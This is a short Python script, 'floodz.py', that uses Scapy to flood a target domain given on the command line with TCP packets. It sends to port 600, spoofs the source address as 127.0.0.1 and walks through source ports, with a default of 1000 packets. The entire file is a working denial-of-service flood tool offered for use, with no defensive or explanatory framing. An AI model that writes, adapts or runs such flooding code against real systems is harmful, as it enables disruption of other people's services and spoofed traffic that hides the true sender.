from scapy.all import *
import sys 
import argparse

parser = argparse.ArgumentParser(description='python floodz.py -d <domain.com> -n <number backet> ')
parser.add_argument("-d" , help="domain name EX: target.com" ,type=str)
parser.add_argument("-n" , help="Number of backet default is 1000 " , default=1000 , type=int)
args = parser.parse_args()

def floodz(source,target,num):
    for source_p in range(0,num):
        IPlayer = IP(src=source,dst=target)
        TCPlayer = TCP(sport=source_p,dport=600)
        pkt = IPlayer/TCPlayer
        send(pkt)

source = "127.0.0.1"
target = args.d
num = args.n
floodz(source,target,num)

